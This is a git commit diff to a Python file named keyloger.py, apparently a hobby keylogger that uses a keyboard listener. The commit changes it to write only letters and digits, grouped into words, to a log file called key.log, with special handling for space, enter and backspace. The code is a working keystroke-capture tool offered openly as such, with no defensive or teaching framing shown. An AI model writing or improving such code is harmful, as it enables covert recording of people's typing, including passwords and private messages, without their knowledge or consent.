1c5d865535b39b4bb1829933f9ef9c89723c0b65
hedi-ch <hedicherni202@gmail.com>
2022-06-22 16:08:19 +0100

    edit the keyloger to enregist only caracter or numerique

--- keyloger.py
+++ keyloger.py
@@ -3,26 +3,37 @@ import logging
 
 word=''
 word_count=0
+word_count_limit=30
 
+#keys={Key.space:"",Key.enter:"",Key.backspace:
+#}
 
 logging.basicConfig(filename='key.log', filemode='a', level=logging.DEBUG,format='%(asctime)s %(message)s')
 
 
 def on_press(key):
 	global word , word_count
-	
 	if key==Key.space or key ==Key.enter:
-		key=" "
+		careter=" "
+	elif key==Key.backspace :
+		word=word[:-2]
+		careter=""
+	elif key=="<65027>" :
+		careter="@"
+	else :
+		careter=str(key)[1:-1]
 	
-	if word_count==20 or key==" ":
+	if word_count==word_count_limit or careter==" ":
 		word_count=0
 		logging.info(word)
-		word=str(key)[1:-1]
-	
-	elif word_count<10:
+		word=""
+
+	elif word_count<word_count_limit and (careter.isalpha() or careter.isnumeric()):
 		word_count+=1
 		print(f"the {key} key is pressed ")
 		word+=str(key)[1:-1]
+		print(f"str(key).isalpha()={str(key)[1:-1].isalpha()}")
+		print(f"str(key).isalpha()={str(key)[1:-1].isnumeric()}")
 
 	
 
